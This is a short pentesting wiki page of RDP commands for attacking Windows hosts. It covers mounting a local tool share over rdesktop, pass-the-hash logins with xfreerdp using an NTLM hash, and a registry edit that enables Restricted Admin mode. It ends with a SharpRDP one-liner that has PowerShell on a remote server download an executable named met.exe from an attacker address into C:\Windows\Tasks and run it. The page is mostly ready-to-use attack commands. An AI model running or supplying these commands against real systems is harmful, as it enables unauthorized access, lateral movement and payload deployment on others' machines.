---
title: "RDP"
date: 2025-10-03
draft: false
type: wiki
---

If we have access to a windows machine with a valid user/credentials and this user is in the "Remote Desktop Users", we can share a local directorie as a mount volume through rdp itself once we connect to the machine:

# Linux

## Mounting Volume

```console
rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
```

## Forcing enable of clipboard

I might want to force the use of the clipboard if it's not being taken by default and use the 100% of the screen:

```console
rdesktop 192.168.42.42 -d arkham -u ceso -p pirata -g 100% -x 0x80 -5 -K -r clipboard:CLIPBOARD
```

## Connection with restricted admin mode

```console
xfreerdp en Linux soporta restricted admin mode, se ejecuta asi por ej: `xfreerdp /u:admin /pth:<NTLM-hash-of-user-admin-pass> /v:192.168.42.42 /cert-ignore
```

-----------------------------

# Windows

## Restricted admin mode

```console
Enable it :
  Through registry:
    HKLM:\System\CurrentControlSet\Control\Lsa
    Use "DisableRestrictedAdmin" property
  With Powershell:
    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0  

Connect it:
  --> mstsc.exe /restrictedadmin
```

## Stacked commands without GUI

```console
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFil
e('http://192.168.42.42/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=example\ceso password=soyUnaPassword
```

-----------------------------
